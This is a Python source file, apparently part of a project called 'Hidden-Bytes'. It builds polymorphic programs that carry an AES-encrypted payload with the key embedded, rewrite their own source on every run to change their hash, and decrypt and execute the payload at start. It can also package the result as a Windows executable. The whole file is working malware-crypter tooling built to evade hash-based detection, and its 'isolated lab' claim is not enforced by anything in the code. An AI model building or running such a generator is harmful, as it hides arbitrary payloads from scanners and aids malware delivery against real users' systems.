#!/usr/bin/env python3
"""Hidden-Bytes — Polymorphic self-modifying program generator.

Generates a program that:

- carries an encrypted payload inside itself,
- rewrites its own source file on every run, so its SHA-256 changes while its
  behaviour stays identical,
- decrypts and executes the payload when it starts.

This is the "polymorphic" half of the project. The payload is supplied by the
operator and is executed only inside the isolated lab environment.

The generated program decrypts its payload with the ``cryptography`` library,
which must be importable at run time (installed in the interpreter that runs
the script, or bundled into the .exe by PyInstaller).
"""

from __future__ import annotations

import argparse
import base64
import os
import secrets
import sys
from pathlib import Path

from .common import KEY_SIZE, NONCE_SIZE
from .embedding import build_executable
from .polymorphic_template import TEMPLATE


def _load_payload(payload_arg: str) -> bytes:
    """Read the payload from the file the operator supplied."""

    candidate = Path(payload_arg)

    if not candidate.is_file():
        raise ValueError(f"payload file does not exist: {payload_arg}")

    payload = candidate.read_bytes()

    if not payload.strip():
        raise ValueError("payload must not be empty")

    return payload


def _encrypt(key: bytes, nonce: bytes, payload: bytes) -> bytes:
    """Encrypt the payload with AES-256-GCM."""

    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    return AESGCM(key).encrypt(nonce, payload, b"HBXP")


def _build_source(payload: bytes) -> str:
    """Build the generated program.

    A fresh random 256-bit key is generated for every build and embedded in
    the generated program so it can recover the payload at run time without a
    passphrase. The key is protected only by the obscurity of the artifact.
    """

    key = os.urandom(KEY_SIZE)
    nonce = os.urandom(NONCE_SIZE)

    ciphertext = _encrypt(key, nonce, payload)

    # The initial token value. At run time the generated program rewrites this
    # with a fresh random token on every run (see the template), so its hash
    # keeps changing indefinitely.
    mutation_token = secrets.token_hex(16)

    source = TEMPLATE
    source = source.replace(
        "{payload_ciphertext}", base64.b64encode(ciphertext).decode("ascii"), 1
    )
    source = source.replace(
        "{payload_nonce}", base64.b64encode(nonce).decode("ascii"), 1
    )
    source = source.replace(
        "{payload_key}", base64.b64encode(key).decode("ascii"), 1
    )
    source = source.replace("{mutation_token}", mutation_token, 1)

    return source


def generate(output: Path, payload_arg: str) -> None:
    """Generate a polymorphic program carrying the supplied payload."""

    output = output.resolve()
    payload = _load_payload(payload_arg)

    source = _build_source(payload)

    # Validate syntax before writing the generated program.
    compile(source, str(output), "exec")

    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(source, encoding="utf-8")

    try:
        output.chmod(0o755)
    except OSError:
        pass


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="polymorphic",
        description=(
            "Generate a self-modifying program that carries an encrypted "
            "payload. Every run rewrites the program's own source, so its "
            "hash changes while its behaviour stays the same."
        ),
    )

    parser.add_argument(
        "--generate",
        required=True,
        metavar="OUTPUT",
        help="path of the generated program",
    )

    parser.add_argument(
        "--payload",
        required=True,
        metavar="PAYLOAD_FILE",
        help="path to the payload file to embed",
    )

    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    try:
        output = Path(args.generate)

        generate(output=output, payload_arg=args.payload)

        print(f'[OK] Generated polymorphic program: "{output}"')
        print("[INFO] The payload is encrypted inside the generated program.")
        print(
            "[INFO] Every run rewrites the program's own source, so its "
            "hash changes while its behaviour stays the same."
        )

        # A .exe output is packaged into a real native executable, because a
        # script renamed to .exe does not run on Windows and is not analysed as
        # a program by a scanner.
        if output.suffix.lower() == ".exe":
            build_executable(
                script_path=output,
                output=output,
                name=output.stem,
            )
            print(f'[OK] Packaged native executable: "{output}"')

        return 0

    except (OSError, UnicodeError, ValueError) as error:
        print(f"polymorphic: error: {error}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
